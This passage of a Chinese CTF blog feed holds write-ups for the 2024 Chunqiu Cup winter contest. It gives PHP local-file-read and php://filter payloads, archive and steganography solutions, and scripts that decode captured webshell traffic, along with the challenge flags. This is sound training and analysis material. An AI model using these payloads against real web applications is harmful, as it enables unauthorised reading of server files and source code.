class="line">python inflate.py &lt; <span class="keyword">out</span>.png &gt; out1.png</span><br></pre></td></tr></table></figure><p>至此大功告成，成功提取到压缩文件里的LP.png</p>]]></content>
    
    
    <summary type="html">🥧两种明文攻击</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="misc姿势" scheme="https://blog.m3x1.cn/tags/misc%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>2024年春秋杯网络安全联赛冬季赛wp-1.19</title>
    <link href="https://blog.m3x1.cn/posts/55fde2b7.html"/>
    <id>https://blog.m3x1.cn/posts/55fde2b7.html</id>
    <published>2025-01-18T16:00:00.000Z</published>
    <updated>2025-01-22T06:51:48.573Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="easy-php">easy_php</h4><blockquote><p>考点：文件上传绕过，截断，源码审计</p></blockquote><p>打开网站后，可以下载源码，先下载源码，然后再扫一下网站目录</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181445364.png" alt="image-20250119181445364"></p><p>配合源码审计，审计过程省略。其中在文件上传的目录下已经有文件了，再结合提示可以知道，不用再自己上传文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181544673.png" alt="image-20250119181544673"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181621889.png" alt="image-20250119181621889"></p><p>那么就需要触发文件，看这里代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181707567.png" alt="image-20250119181707567"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119181802190.png" alt="image-20250119181802190"></p><p>可以知道在/file.php页面中可以进行url的get传参，然后会将参数值过滤后进行高亮，触发反序列化链。</p><p>但是这里的过滤中，是f1ag而不是flag，所以其实没有过滤flag关键词。</p><p>因此结合源码，直接构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/flag</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250119182045246.png" alt="image-20250119182045246"></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a16dcb7549915546893a27a6d7927615&#125;</span><br></pre></td></tr></table></figure></blockquote><h4 id="easy-code">easy_code</h4><blockquote><p>考点：利用PHP特性绕过，filter伪协议</p></blockquote><p>访问/robots.txt 可以看到有 gogogo.php</p><p>ctfer 参数有三个检测，只需要用科学计数法，PHP 会自动四舍五入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfer=6.66999999999999999999999999999999999999999e2</span><br></pre></td></tr></table></figure><p>Hackbar 里设置 cookie 为 pass=admin</p><p><img src="http://cn-sec.com/wp-content/uploads/2025/01/6-1737303857.png" alt="2024春秋杯冬季赛三日Writeup汇总(https://gitee.com/star3119391396/cloudimage/raw/master/img/6-1737303857.png)"></p><p>Include 那里使用 php://filter 配合 convert.iconv 修改字符集使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ile=php://filter/convert.iconv.utf-8.utf-16le/resource=read.php</span><br></pre></td></tr></table></figure><h2 id="misc">misc</h2><h4 id="音频的秘密">音频的秘密</h4><blockquote><p>考点：知道部分明文破解压缩包</p></blockquote><p>下载附件解压，是一个wav文件，根据提示知道，是deepsound加密，且密码为弱口令。</p><p>用deepsound解密，弱口令密码一个一个试，最后密码为123，得到一个flag.zip</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120222149903.png" alt="image-20250120222149903"></p><p>提取出来，发现需要密码，压缩包内是一张图片。</p><p>用各种工具爆破，发现长时间都没爆破出来，最后赛后复现，看别人wp才知道，明文加密除了使用完整明文文件外，也有一种使用一部分明文文件的爆破方式。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120225951271.png" alt="image-20250120225951271"></p><p>得到一张png图片，在rgb处发现flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250120230117284.png" alt="image-20250120230117284"></p><blockquote><p>flag{Y1_Shun_jian_Fa_ZE_Dian_Fu}</p></blockquote><h4 id="Infinity">Infinity</h4><blockquote><p>考点：套娃压缩包，解码</p></blockquote><p>下载压缩包解压，里面是张png图片，放进010editor查看，发现有嵌套文件。</p><p>进行文件分离，得到一个压缩包。</p><p>压缩包里有zip,tar,7z三种，且压缩包名字感觉像是某种编码。</p><p>写脚本直接解压并记下文件名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import tarfile</span><br><span class="line">import py7zr</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip\\&quot;</span><br><span class="line">count = []</span><br><span class="line">txt = open(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\count.txt&quot;, &quot;w&quot;)</span><br><span class="line">while True:</span><br><span class="line">    contents = os.listdir(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">    for i in contents:</span><br><span class="line">        if i not in count:</span><br><span class="line">            file_path = path + i</span><br><span class="line">            txt.write(i + &quot;\n&quot;)</span><br><span class="line">            file_extension = i.split(&#x27;.&#x27;)[-1]</span><br><span class="line">            if file_extension == &#x27;zip&#x27;:</span><br><span class="line">                with zipfile.ZipFile(file_path, &#x27;r&#x27;) as zip_ref:</span><br><span class="line">                    zip_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;tar&#x27;:</span><br><span class="line">                with tarfile.open(file_path, &#x27;r&#x27;) as tar_ref:</span><br><span class="line">                    tar_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            elif file_extension == &#x27;7z&#x27;:</span><br><span class="line">                with py7zr.SevenZipFile(file_path, &#x27;r&#x27;) as seven_ref:</span><br><span class="line">                    seven_ref.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\新建文件夹 (2)\\foremost_output\\zip&quot;)</span><br><span class="line">                file_path = path + i</span><br><span class="line">                count.append(i)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;File extension not supported&quot;)</span><br><span class="line">                break</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122143943094.png" alt="image-20250122143943094"></p><p>解压后得到一个SeCr3t.txt，文件内容是Inf1nityIsS0CoOL。</p><p>用脚本对这些字符串进行处理，发现在逆序的时候能根据提示进行解码。即代码中的第二个print。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = open(&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\Infinity\\flag.txt&quot;, &quot;r&quot;).read()</span><br><span class="line">#文本之中每行有一个字符串</span><br><span class="line">data = data.split(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">print(&quot;&quot;.join(data))  #将每行字符串顺序连接起来</span><br><span class="line">print(&quot;&quot;.join(reversed(data)))  #将每行字符串逆序连接起来</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in data]))  #将每行字符串反转后顺序连接起来</span><br><span class="line">print(&quot;&quot;.join([d[::-1] for d in reversed(data)])) #将每行字符串反转后再逆序连接起来</span><br></pre></td></tr></table></figure><p>根据提示知道，是BASE58-Ripple<code>+</code>SM4-ECB，sm4中的key改为上述文件内容，得到一张条形码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144403181.png" alt="image-20250122144403181"></p><p>由于下载下来的图片是很暗的，很难直接识别，所以要先加白底。简便方法就i是直接预览加截图保存，然后扫描截图。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144536029.png" alt="image-20250122144536029"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250122144840998.png" alt="image-20250122144840998"></p><blockquote><p>flag{a72dd260-f64d-4116-ab50-b26b40d69883}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧2024年春秋杯网络安全联赛冬季赛wp-1.19</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>2024年春秋杯网络安全联赛冬季赛wp-1.18</title>
    <link href="https://blog.m3x1.cn/posts/22fad221.html"/>
    <id>https://blog.m3x1.cn/posts/22fad221.html</id>
    <published>2025-01-17T16:00:00.000Z</published>
    <updated>2025-01-18T10:31:24.837Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Weevil’s-Whisper">Weevil’s Whisper</h4><blockquote><p>考点：流量分析，代码审计</p></blockquote><p>下载附件，进行流量分析，看到上传的代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118152835441.png" alt="image-20250118152835441"></p><p>进行代码审计可以知道，在http中的返回结果是由$p$kh$r$kf组成的，而$p,$kh,$kf是固定的，所以可以提取出来$r。</p><p>再看代码，$r是$o进行一系列加密而成，而$o就是执行完成后返回的结果，所以只需要写脚本反解$r就能出现结果。</p><p>exp:</p><p>提取$r的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 示例字符串列表</span><br><span class="line">strings = [</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoCUFRXAGExNS5kaQ==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoCUVRSBofUNDFgR2Uu4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3Gn9+Y9vPGke3VobnQcgMjZ07P4e4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSap6KU+uuy3+Gn+oqy3SgTM2GBxmng==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KDcNeR4REFocJJk1HBl0qNk7deBc=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRocex13UHArABWxOndUQ9OgshQjxynrZlCq/6T5cu61Krv/IHD3+b2orH9lOVptWeGII4RxOXL8430BAdncvckuSSO0sLezOyQtVRZDXEBUIN0WNIiXiPDjTSEHYr27l+n0o2bkLikF+AhTDZWmqPLwPjZQDwG2XfWAkgPXY1EUbDC4bYsoIhZp4dXo5aotJl8EN2fSNHw/A6OAF3bAzSZ0VwBTYY5PCI1JO6H3dvTFKjQH1eUHgFG2VQRT5weB1TK8SJbDV7ljYnci/EA=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapk9b8P9VQl8+6WNSyPLHPzvij/ylGSUNpA5t/uHJmJm+BTi7aP7VLJygt/d3FEQUimFkyDmbL8mFAVMhgF+1Gs7oBe4PQqwN9d2TrCgLfYKoAmZ0Urg7pPrwOnlrE0kk7EkRo4ixqPCo6yK130dz4vGutEl+3+73+xeqIlSVX5Yto45yKnaJCMGyqoTnnS8wwwP+8n50+ZdAM4qvo/mRr+y5ip4DufES6xa2CtH70/I8loiokseAeG7uOO/6knTkKXYtT3jYy4nkA9pBHV16zWEk9K4rbAYxUP7Wg5VjiTuQIOXn7obn8BiHrv0F7qr/0wsTDNvohMh/nDE48kg7Q6aOF9LRLGw3q0CC9v7TJ1ESDAK+/EDa1VVxZ2NFhCau/sJPDj7RIoyYcQM6DngEBgUAdYZHmZ1JaIgRat0p2LPt0KBKwtw7whLX8IYbleQO+EAw6Z9xoxfeTrfg==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoMNdkK9FQ96jqRfbz7Eb2ahw+iHTdlC4Jycu3Wc6NzHvj1CkDJnwN7Y0tlljncCpyGmLWKkJ8P9vn7+LMgkb6enEWqTEEo6SqEXMEx0hkif8i1ylrtYQMZtXrJOmPDJdFRbnFNkW5LpGJo7YkFXvcsKco+DEXDYbfwpfoOLwbRVOG7szZ2/62QRq1YgBUHQ3WMH6R9AKmA60x7lNTaxCR4own8gOMQQHihtK6txmaS+OFGZJXAN7voVNEJvBXvFOZdq3JAPdTCjmeAlrPcstZowZPuO43GbdE=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KLWVSMCOW4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaq88Ykq5AQp8Y5Ku1nbYo0yjmWk/JdGMnvNM6SvX9LEE2xigxZnaBkevdBZ0SzjRJMK8tdPvGU8jCHt7GAH5H26TORj1sKJr5Kun5azyBfL7VycyFicwHpZ3dNlCfQKgmnXwXjqOUaEoQzUKr1Tl8I4triU1OQURapT0lulJK50NfNqPGAXJ8Xn1V2LYVm0G5XJRBNy/ReWo7ed+7l6s/MxHEyH6XMnfBeZdtpmA619VEnyc79tzVa40twaBUYtr6UaH3BnKkQN1shhZwzITAiwEK4xOJ1MO0nIRsvyXOCE5ABChBqc7g3tN79p7dZ6sjNZ2TQl4s7AtCOzyP2KBEXLE9lyrhwjV9N+n3uE3MfQvjChErcCmWNfuE7mcHq4W8XunjLiw4W5cHWaJiEzqDeza77m3+cPvHijF0HB52HNyEedxDbZOahxSuXnUmDO+k49fVa/s5h/wppFk/vjEHgg83Mo3zpAMsw5UqJTogEihVRbGDY5wUenU0nW70cdM45s3+wEA9a8VsDn2tgRPBnbNhtktiE3A7S+DH1fsV52Nf1V/sQbS5ssncWL/6EWJuwy42AK3I4s6lgzCT3An2Hf5rhfGXPpogKVGeIGexqRSrjv09hGwqBSeYJO8EHrI6IqWeFoDuYEI2jvP2DAM/+zri6Z8n2fsDkDeBbyYtFBHr7f2NqbL4AcTuszXn9pcqH238vIjZaPJBqbqvDTzeOsEYDc01cLkHk4rzqYoLQq9m7arE591m+q1sKHBsa0lcqqVpfpLjo7H0UzWt2uHlVNUjr96ijvXvNermcaEfhatwceGBGR64xGuZWAzN8o1I+V6469kyeG5pfE3uaDo0EcFlW7TdogYacKoMRTeOE0vcNibkNKaRj9CiAc/jrKrq+Nm30eYtpC5AZh38Cc85V6B2T3e16g4p1dJ9fgwWTSTbVQrv2zsJEp4QgFoyiuYrPIV62Lx++LhGsiVMyRnCh4deY5WX8vBuZOfC5Nhg==4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3yn9OYyvPisf3VobnQcgMjZ13f4I4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSaoyZWJkN2U=4e0d86dbcf92&quot;,</span><br><span class="line">    &quot;lFDu8RwONqmag5ex45089b3446eeSap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ2L1hsAA==4e0d86dbcf92&quot;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 定义正则表达式模式</span><br><span class="line">pattern = re.compile(r&#x27;lFDu8RwONqmag5ex45089b3446ee(.*?)4e0d86dbcf92&#x27;)</span><br><span class="line"></span><br><span class="line"># 提取并打印结果</span><br><span class="line">for string in strings:</span><br><span class="line">    match = pattern.search(string)</span><br><span class="line">    if match:</span><br><span class="line">        extracted_string = match.group(1)</span><br><span class="line">        print(f&quot;Extracted: &#123;extracted_string&#125;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;No match found in: &#123;string&#125;&quot;)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>反解$r的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$k=&quot;161ebd7d&quot;;$kh=&quot;45089b3446ee&quot;;$kf=&quot;4e0d86dbcf92&quot;;$p=&quot;lFDu8RwONqmag5ex&quot;;</span><br><span class="line">function x($t,$k)&#123;</span><br><span class="line">  $c=strlen($k);$l=strlen($t);$o=&quot;&quot;;</span><br><span class="line">  for($i=0;$i&lt;$l;)&#123;</span><br><span class="line">    for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span><br><span class="line">    &#123;</span><br><span class="line">      $o.=$t[$i]^$k[$j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r=array(&quot;SaoCUFRXAGExNS5kaQ==&quot;,&quot;SaoCUVRSBofUNDFgR2Uu&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3Gn9+Y9vPGke3VobnQcgMjZ07P4e&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sap6KU+uuy3+Gn+oqy3SgTM2GBxmng==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KDcNeR4REFocJJk1HBl0qNk7deBc=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRocex13UHArABWxOndUQ9OgshQjxynrZlCq/6T5cu61Krv/IHD3+b2orH9lOVptWeGII4RxOXL8430BAdncvckuSSO0sLezOyQtVRZDXEBUIN0WNIiXiPDjTSEHYr27l+n0o2bkLikF+AhTDZWmqPLwPjZQDwG2XfWAkgPXY1EUbDC4bYsoIhZp4dXo5aotJl8EN2fSNHw/A6OAF3bAzSZ0VwBTYY5PCI1JO6H3dvTFKjQH1eUHgFG2VQRT5weB1TK8SJbDV7ljYnci/EA=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sapk9b8P9VQl8+6WNSyPLHPzvij/ylGSUNpA5t/uHJmJm+BTi7aP7VLJygt/d3FEQUimFkyDmbL8mFAVMhgF+1Gs7oBe4PQqwN9d2TrCgLfYKoAmZ0Urg7pPrwOnlrE0kk7EkRo4ixqPCo6yK130dz4vGutEl+3+73+xeqIlSVX5Yto45yKnaJCMGyqoTnnS8wwwP+8n50+ZdAM4qvo/mRr+y5ip4DufES6xa2CtH70/I8loiokseAeG7uOO/6knTkKXYtT3jYy4nkA9pBHV16zWEk9K4rbAYxUP7Wg5VjiTuQIOXn7obn8BiHrv0F7qr/0wsTDNvohMh/nDE48kg7Q6aOF9LRLGw3q0CC9v7TJ1ESDAK+/EDa1VVxZ2NFhCau/sJPDj7RIoyYcQM6DngEBgUAdYZHmZ1JaIgRat0p2LPt0KBKwtw7whLX8IYbleQO+EAw6Z9xoxfeTrfg==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SaoMNdkK9FQ96jqRfbz7Eb2ahw+iHTdlC4Jycu3Wc6NzHvj1CkDJnwN7Y0tlljncCpyGmLWKkJ8P9vn7+LMgkb6enEWqTEEo6SqEXMEx0hkif8i1ylrtYQMZtXrJOmPDJdFRbnFNkW5LpGJo7YkFXvcsKco+DEXDYbfwpfoOLwbRVOG7szZ2/62QRq1YgBUHQ3WMH6R9AKmA60x7lNTaxCR4own8gOMQQHihtK6txmaS+OFGZJXAN7voVNEJvBXvFOZdq3JAPdTCjmeAlrPcstZowZPuO43GbdE=&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapC0+gVG0z5/30rTq37qxq4GK1KbBlNfJ+1VoCpeyTdVAHewkwIQg0KLWVSMCOW&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Saq88Ykq5AQp8Y5Ku1nbYo0yjmWk/JdGMnvNM6SvX9LEE2xigxZnaBkevdBZ0SzjRJMK8tdPvGU8jCHt7GAH5H26TORj1sKJr5Kun5azyBfL7VycyFicwHpZ3dNlCfQKgmnXwXjqOUaEoQzUKr1Tl8I4triU1OQURapT0lulJK50NfNqPGAXJ8Xn1V2LYVm0G5XJRBNy/ReWo7ed+7l6s/MxHEyH6XMnfBeZdtpmA619VEnyc79tzVa40twaBUYtr6UaH3BnKkQN1shhZwzITAiwEK4xOJ1MO0nIRsvyXOCE5ABChBqc7g3tN79p7dZ6sjNZ2TQl4s7AtCOzyP2KBEXLE9lyrhwjV9N+n3uE3MfQvjChErcCmWNfuE7mcHq4W8XunjLiw4W5cHWaJiEzqDeza77m3+cPvHijF0HB52HNyEedxDbZOahxSuXnUmDO+k49fVa/s5h/wppFk/vjEHgg83Mo3zpAMsw5UqJTogEihVRbGDY5wUenU0nW70cdM45s3+wEA9a8VsDn2tgRPBnbNhtktiE3A7S+DH1fsV52Nf1V/sQbS5ssncWL/6EWJuwy42AK3I4s6lgzCT3An2Hf5rhfGXPpogKVGeIGexqRSrjv09hGwqBSeYJO8EHrI6IqWeFoDuYEI2jvP2DAM/+zri6Z8n2fsDkDeBbyYtFBHr7f2NqbL4AcTuszXn9pcqH238vIjZaPJBqbqvDTzeOsEYDc01cLkHk4rzqYoLQq9m7arE591m+q1sKHBsa0lcqqVpfpLjo7H0UzWt2uHlVNUjr96ijvXvNermcaEfhatwceGBGR64xGuZWAzN8o1I+V6469kyeG5pfE3uaDo0EcFlW7TdogYacKoMRTeOE0vcNibkNKaRj9CiAc/jrKrq+Nm30eYtpC5AZh38Cc85V6B2T3e16g4p1dJ9fgwWTSTbVQrv2zsJEp4QgFoyiuYrPIV62Lx++LhGsiVMyRnCh4deY5WX8vBuZOfC5Nhg==&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;SapiXZwT7J5S6ST5d8pqvEtS7r6h3xg76c7bnajhvB2IIsfYvx7Tppa1JhN/WUI48PTopzqz/731u6ZuSoFbcdJuYfXx/as8o6+uMn43pzUhamP/MG1QoKqvsb2nBEElYEh9HRrc9bISccd6uGcFpPn2+SG9tH+7+XJwpKq8/aR9NzkJPli0iCXWcWrDqCfM/ebpr7pkrFYT45Rzd4EgBetan+Vk6Bpw40QjtpcuHS4BY1JWWkcGXWoZCFp1wO20Y+kx7e7l+VSwDDJr7hC75YdT18DGMt8BpdLXxfsKUwFTt9dxcRc84dO65fl+JwoEaVSJo6psvA/7BQNuEHa8V8V2/2ekcK2DJUBNXhUA+FtVYWh9e09r24fBJ+MAN5cGYbIY/TqOrzwr3yn9OYyvPisf3VobnQcgMjZ13f4I&quot;,&quot;SaoyZWJkN2U=&quot;,&quot;Sap6risomCodHP/PqrQaqvueeU+wURkueAeGLStP+bQE+HqsLq39zTQ